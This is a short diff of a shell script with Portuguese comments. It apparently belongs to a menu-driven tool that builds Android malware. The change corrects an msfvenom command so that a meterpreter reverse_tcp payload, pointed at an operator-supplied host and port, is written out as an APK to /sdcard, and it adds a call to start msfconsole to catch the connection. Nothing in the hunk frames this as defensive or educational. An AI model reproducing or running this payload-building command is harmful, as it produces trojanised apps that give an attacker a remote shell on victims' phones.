@@ -53,7 +53,8 @@ cd ..
 cd $HOME ; cd metasploit-framework
 #
 #Criando payload
-./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R /sdcard/$nome.apk
+./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
+./msfconsole
 fi
 if [ "$opcao" = "2" ];then
 echo
